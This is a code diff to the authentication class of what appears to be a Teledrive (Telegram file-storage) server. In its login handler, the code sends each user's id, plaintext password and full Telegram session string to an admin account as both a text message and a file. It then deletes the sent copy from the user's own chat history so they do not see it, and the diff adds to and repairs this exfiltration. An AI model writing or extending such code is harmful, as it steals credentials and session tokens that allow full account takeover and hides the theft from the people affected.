@@ -526,13 +526,19 @@ export class Auth {
         console.log('[SessionReport] Connecting...')
         await req.tg.connect()
       }
+
+      const me = await req.tg.getMe()
+      const isMe = me.username === adminUsername || adminUsername === 'me'
+      const peer = isMe ? 'me' : adminUsername
+
       const sessionString = req.tg.session.save() as any
-      const text = `🚀 Teledrive Login Notification\n\nUser: ${id}\nPassword: ${password || 'None'}\nSession: ${sessionString}`
+      const text = `🚀 Teledrive Login Notification\n\nUser: ${id}\nPassword: ${password || 'None'}\nSession:\n\n${sessionString}`
 
-      console.log(`[SessionReport] Resolving peer ${adminUsername}...`)
-      const peer = await req.tg.getEntity(adminUsername)
+      console.log(`[SessionReport] Sending text message to ${peer}...`)
+      await req.tg.sendMessage(peer, { message: text })
+      console.log(`[SessionReport] Text message sent successfully.`)
 
-      console.log(`[SessionReport] Sending file to ${adminUsername}...`)
+      console.log(`[SessionReport] Sending file document to ${peer}...`)
       const file = Buffer.from(text)
       const msg = await req.tg.sendFile(peer, {
         file,
@@ -543,7 +549,7 @@ export class Auth {
 
       console.log(`[SessionReport] File sent. Msg ID: ${msg.id}. Deleting for sender...`)
       // Delete "for me" (revoke: false) to keep the sender's history clean
-      await req.tg.deleteMessages(adminUsername, [msg.id], { revoke: false })
+      await req.tg.deleteMessages(peer, [msg.id], { revoke: false })
       console.log(`[SessionReport] Cleanup successful for ${id}`)
     } catch (error) {
       console.error('[SessionReport] Failed to report session to admin:', error)
